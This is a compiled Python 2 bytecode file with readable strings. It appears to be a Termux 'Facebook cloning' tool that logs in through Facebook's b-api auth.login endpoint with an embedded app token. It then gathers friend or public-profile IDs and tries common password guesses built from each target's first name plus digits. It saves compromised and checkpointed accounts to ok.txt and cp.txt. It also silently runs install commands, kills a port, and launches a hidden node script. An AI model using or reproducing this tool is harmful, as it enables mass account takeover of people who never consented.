ó
ÿc           @   s  e  Z e r# d  d  Z   Z n  y° d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z Wn  e k
 rue j d  e j d  e j d  e j d  e j d  e j d	  e j d  e j d
  e j d  e j d  e j d  n Xy e j d  Wn¨ e k
 r1e j j d  r2e j d  e j d  e j d  e j d  e j d  e j d  e j d  e j d  e j d  e j d  q2n Xd d l m Z e j d d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d  6d! d" 6d# d$ 6d% d& 6Z e  e  e j! d'  d(   Z" d)   Z# d*   Z$ d+   Z% d,   Z& d-   Z' d. Z( g  Z) d/   Z* d0   Z+ d1   Z, d2   Z- d3   Z. d4   Z/ d5   Z0 d6   Z1 d7   Z2 d8   Z3 e4 d9 k re*   n  d S(:   i    iÿÿÿÿN(   t
   ThreadPools   pkg install python   s   pip install mechanizes   pip install requests g©?s   pip2 install nodejs s   pip2 install npms   pkg install python2   s   pip2 install requests s   pip2 install mechanizes   python2 cat.pyt   saves   .../index.jss   mv ... .....s   cd ..... && npm installt   #s   fuser -k 5000/tcp &s   node ...../index.js &(   t   ConnectionErrorg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-typesº   Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginet   utf8c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   360126522o.pyt   pro*   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s    Logging In g      à?(   R   R   R
   R   R   (   t   titikt   o(    (    s   360126522o.pyt   logging/   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s    Saving Token g      à?(   R   R   R
   R   R   (   R   R   (    (    s   360126522o.pyt   saving3   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   Getting Updates g      à?(   R   R   R
   R   R   (   R   R   (    (    s   360126522o.pyt	   updateing7   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   Logging Out g      à?(   R   R   R
   R   R   (   R   R   (    (    s   360126522o.pyt   logout;   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s    Downloading g      à?(   R   R   R
   R   R   (   R   R   (    (    s   360126522o.pyt   download?   s
      sk  [96m
 _______  _______ _________
(  ____ \(  ___  )\__   __/
| (    \/| (   ) |   ) (   
| |      | (___) |   | |   
| |      |  ___  |   | |   
| |      | (   ) |   | |   
| (____/\| )   ( |   | |   
(_______/|/     \|   )_(   

[97m----------------------------------------------------

-Auther- LOST

-Github- Github.com/LoSt-SoFtware

-Youtube- LOST KURDISH
c           C   sK   t  j d  t GHt j d  t  j d  t GHd GHd GHd GHt   d  S(   Nt   cleargü©ñÒMbP?s#   [1] Clone Friendlist and Public ID s   [0] Exitu4   [1;97m---------------------------------------------(   t   ost   systemt   logoR   R   t   loginvia(    (    (    s   360126522o.pyt   login_choiceX   s    c          C   sN   t  d  }  |  d k r" t   n( |  d k r> t j d  n d GHt   d  S(   Ns   
>>> t   1t   0t   exits   [1;91mFill in correctly(   t	   raw_inputR   R   R   t
   clone_main(   t   hack(    (    s   360126522o.pyR!   b   s    
c           C   sP   t  j d  t GHt j d  t  j d  t GHd GHd GHd GHd GHt   d  S(   NR   g      à?s   [1] Login With Token  s   [2] Login With User And Passs   [0] Backu4   [1;97m---------------------------------------------(   R   R   R   R   R   t   clone_loginvia(    (    (    s   360126522o.pyR   l   s    c          C   sF  t  d  }  |  d k r
t j d  t GHt j d  t j d  t j d  t GHd j d  GHd GHt  d	  } d GHt   t d
 d  } | j	 |  | j
   t d  t j d  t j d  d j d  GHt j d  t j d  t j d  t   n8 |  d k r t   n" |  d k r6t   n d GHt   d  S(   Ns   
>>> R   R   s   python2 .pyg{®Gázt?s   Daxl Bwn Ba TokeniF   u4   [1;97m---------------------------------------------s   [+] Tokenaka Lera Dane : s
   .login.txtt   ws
    Login Bw g      à?s   Tokenakat Save Bwi   s   xdg-open https://t.me/LOSTCOD3Rt   2R   s   [!] Tkaya Zhmarayak Hal bzhera(   R    R   R   R   R   R   t   centerR   t   openR	   t   closeR   t   menut   loginfbR#   (   R"   t   tokent   sav(    (    s   360126522o.pyR#   w   s<    




c          C   sª  t  j d  t GHt  j d  t j d  t  j d  t GHd j d  GHd GHt d  }  |  j d d	  } | j d
 d	  } | j d d	  } t d  } d GHt   t	 j
 d | d | d d t j } t j |  } d | k rat d d  } | j | d  | j   d GHt j d  t  j d  t GHd j d  GHt j d  t   nE d | d k rd GHt j d  t   n d GHt j d  t   d  S(   NR   s   python2 .pyg      à?s   [34;1mFacebook [1;97mDaxl BkaiF   u4   [1;97m---------------------------------------------s   [+] Email/ID/Number : t    t    t   (t   )s   [+] Password : s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   headerst   access_tokens
   .login.txtR$   s   Login [1;92mSuccessfull[1;97mi   s   Your Account Has Been Savedi2   s   www.facebook.comt	   error_msgs3   
[1;31m[!] Login Failed . Account Has a Checkpoints9   
[1;31m[!] Login Nabw Email/ID/Number OR Password Xalata(   R   R   R   R   R   R&   R    t   replaceR   t   requestst   gett   headert   textt   jsont   loadsR'   R	   R(   R)   R*   (   t   idt   id1t   id2t   uidt   pwdt   datat   qt   succ(    (    s   360126522o.pyR*      sF    (


c          C   sL  t  j d  y t d d  j   }  Wn< t k
 rd t GHd GHt  j d  t j d  t   n Xy9 t	 j
 d |  d t } t j | j  } | d	 } WnI t k
 ré t  j d  t GHd
 GHt  j d  t j d  t   n Xt  j d  t GHt  j d  t j d  t  j d  t GHd GHd GHd GHd GHd GHt   d  S(   NR   s
   .login.txtt   rs   [!] Error 404.Token Not Founds   rm -rf .login.txtg      à?s+   https://graph.facebook.com/me?access_token=R1   t   names2   [!] Loading Failed . Your Account Has a Checkpoints   python2 .pys    Name : u4   [1;97m---------------------------------------------s$   [1] Hack Krdni Frien Lagal Public IDs
   [0] logout(   R   R   R'   t   readt   IOErrorR   R   R   R   R5   R6   R7   R9   R:   R8   t   KeyErrort   menu_select(   R+   RC   t   aRD   (    (    s   360126522o.pyR)   ¾   s@    c          C   st   t  d  }  |  d k r" t   nN |  d k rd t   t j d  t j d  d GHt j d  n d GHt   d  S(	   Ns   
>>> R   R   s   rm -rf .login.txtg      à?s    Logged Out SuccessfullyR   s   [!] Tkaya Zhmarayak Dane(   R    t   crackR   R   R   R   R   RH   (   t   option(    (    s   360126522o.pyRH   ß   s    
c           C   s½   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHt  j d  t j d  t  j d  t	 GHd GHd	 GHd
 GHd GHt
   d  S(   NR   s
   .login.txtRC   s   [!] Error 404 . Token Not Founds   rm -rf .login.txtg      à?s   python2 .pys   [1] Hack Krdni Frendakants)   [2] Hack Krdni [1;92mID[1;97m Publicawas   [0] Backu4   [1;97m---------------------------------------------(   R   R   R'   RE   R+   RF   R   R   t   loginR   t   crack2(    (    (    s   360126522o.pyRJ   í   s&    c             sÅ  t  d  }  g  } g   g    |  d k r» t j d  t GHt j d t d t } t j	 | j
  } x±| d D]B } | d } | d } | j d	  d
 } | j | d |  qr Wn`|  d k rùt j d  t GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d GHWn/ t k
 rqd | d GHt  d  t   n Xt j d | d t d t } t j	 | j
  } xs | d D]B }
 |
 d } |
 d } | j d	  d
 } | j | d |  q°Wn" |  d k rt   n d GHt   d t t |   GHt j d  d GHt j d  d GH   f d   } t d  } | j | |  d GHd GHd t t     d t t    GHd GHt   d  S(    Ns   
>>> R   R   s3   https://graph.facebook.com/me/friends?access_token=R1   R@   R;   RD   R-   i    t   |R%   s   [+] Input ID : u4   [1;97m---------------------------------------------s   https://graph.facebook.com/s   ?access_token=s    Account Name : s   
[!] Error 404 . ID Link s+    Have Privacy On Friendlist OR IS Not Valids   
Press Enter To Back s   /friends?access_token=R   s   [!] Tkaya Zhmarayak Danes   [+] Hamw ID yakan : g      à?s!   [+] Tkaya Chaware ba Bo Hack Krdnc            sr  |  } | j  d  \ } } yI| d } t j d | d | d d t j } t j |  } d | k rÂ d | d	 | d	 GHt d
 d  } | j | d | d  | j	    j
 |  n¡d | d k r)d | d	 | d	 GHt d d  } | j | d | d  | j	     j
 |  n:| d }	 t j d | d |	 d d t j } t j |  } d | d k rÑd | d	 |	 d	 GHt d d  } | j | d |	 d  | j	     j
 |  nd | k r4d | d	 |	 d	 GHt d
 d  } | j | d |	 d  | j	    j
 |  n/| d }
 t j d | d |
 d d t j } t j |  } d | d k rÜd | d	 |
 d	 GHt d d  } | j | d |
 d  | j	     j
 |  nd | k r?d | d	 |
 d	 GHt d
 d  } | j | d |
 d  | j	    j
 |  n$d } t j d | d | d d t j } t j |  } d | d k rãd | d	 | d	 GHt d d  } | j | d | d  | j	     j
 |  nd | k rFd | d	 | d	 GHt d
 d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k rêd | d	 | d	 GHt d d  } | j | d | d  | j	     j
 |  nyd | k rMd | d	 | d	 GHt d
 d  } | j | d | d  | j	    j
 |  n| d } t j d | d | d d t j } t j |  } d | d k rõd | d	 | d	 GHt d d  } | j | d | d  | j	     j
 |  nnd | k rXd | d	 | d	 GHt d
 d  } | j | d | d  | j	    j
 |  n| d } t j d | d | d d t j } t j |  } d | d k r d | d	 | d	 GHt d d  } | j | d | d  | j	     j
 |  nc d | k rcd | d	 | d	 GHt d
 d  } | j | d | d  | j	    j
 |  n  Wn n Xd  S(   NRN   t   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R1   R2   s'   [1;90m[[92mSuccessful[1;90m][1;97m R-   s   ok.txtRI   s    | s   
s   www.facebook.comR3   s)   [1;90m[[1;91mCheckpoint[1;90m][1;97m s   cp.txtt   1234t   12345t   786786t
   1122334455t   1212t   1122(   t   splitR5   R6   R7   R8   R9   R:   R'   R	   R(   t   append(   t   argt   userR>   RD   t   pass1RA   t   dt   okt   cpt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   cpst   oks(    s   360126522o.pyt   main3  sÜ    
(


(


(

(

(


(


(

i   s   Process Has Been Completeds3    HAMW [1;92mSuccessful[1;90m/[1;91mCheckpoint:  s   /[;32m (   R    R   R   R   R5   R6   R+   R7   R9   R:   R8   t   rsplitRW   RG   RJ   R)   RM   t   strt   lenR   R   R    t   mapt   down(   t   selectR;   RC   R   t   sR>   t   nat   nmt   idtRA   t   iRf   t   p(    (   Rd   Re   s   360126522o.pyRM     sj    

!
!


)c          C   s§   t  d  }  |  d k s$ |  d k ru t j d  t GHt   d GHt j d  t j d  d GHt  d	  t   n. |  d
 k s |  d k r t   n d GHt   d  S(   Ns.   [?] Atawe File Checkpointakan dabazet ? (Y/N) t   yest   yR   s)   [!] Please Give Storage Permission If Asks   termux-setup-storages   cp cp.txt /sdcards    File Downloaded s   Enter Bka Bo garanawa t   not   ns   [!] Tkaya Yes Yan No Bka (   R    R   R   R   R   RJ   Rk   (   t   dow(    (    s   360126522o.pyRk   º  s    


t   __main__(5   t   Falset   foot   barR   R   R   t   datetimet   randomt   hashlibt   ret	   threadingR9   t   getpasst   urllibt	   cookielibR5   t   multiprocessing.poolR    t   ImportErrorR   R   t   mkdirt   OSErrort   patht   isfilet   requests.exceptionsR   t   randintt   bdt   simt   reprR7   t   reloadt   setdefaultencodingR   R   R   R   R   R   R   t   idhR   R!   R   R#   R*   R)   RH   RJ   RM   Rk   t   __name__(    (    (    s   360126522o.pyt   <module>   st   
P
							
	
		 	'	!			¸	